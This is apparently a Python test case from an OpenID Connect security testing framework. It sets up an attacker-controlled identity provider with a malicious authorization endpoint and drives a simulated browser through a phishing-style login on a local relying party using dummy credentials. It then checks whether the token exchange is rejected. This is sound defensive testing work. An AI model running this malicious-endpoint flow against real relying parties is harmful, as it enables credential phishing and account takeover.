import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../osbtlib'))

from osbtlib import BrowserSimulator, Osbtlib

# Test Information
test_name = "MaliciousEndpoint"
test_description = "MaliciousEndpoint description"
outcome = "Failed"
err_msg = ""
countermeasure = "MaliciousEndpoint countermeasure"

ATTACKER_OP_ENDPOINT = "http://localhost:9997"
HONEST_OP_ENDPOINT = "http://localhost:9998"
HONEST_RP_ENDPOINT = "http://localhost:9999"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"

osbt = Osbtlib(
    attacker_op_url = ATTACKER_OP_ENDPOINT
)

try:
    # send order to attacker op
    endpoints = {
        'authorization_endpoint': HONEST_OP_ENDPOINT + '/auth'
    }
    res = osbt.attacker_op.set_malicious_endpoints(endpoints)
    print("request sent:", res)

    time.sleep(5)

    # victim credentials
    victim_username = 'test-user@localhost'
    victim_password = 'verysecure'

    # browser simulation
    sso_flow = f"""
page.locator('input[name="username"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('button[type="submit"]').click()
print(page.content())
    """
    
    # fishing login
    print(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_OP_ENDPOINT}/')
    bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_OP_ENDPOINT}/', PROXY_SERVER_ENDPOINT)
    bs.run(sso_flow)
    content = bs.get_content()
    print("content:", content)
    bs.close()

    # result check
    if "failed to exchange token" not in content:
        outcome = "Passed"

    osbt.attacker_op.clean()

    osbt.cli.send_result(test_name, test_description, outcome, err_msg, countermeasure)
except Exception as e:
    print('Error:', e)
    osbt.attacker_op.clean()

    outcome = "Failed"
    err_msg = str(e)
    osbt.cli.send_result(test_name, test_description, outcome, err_msg, countermeasure)
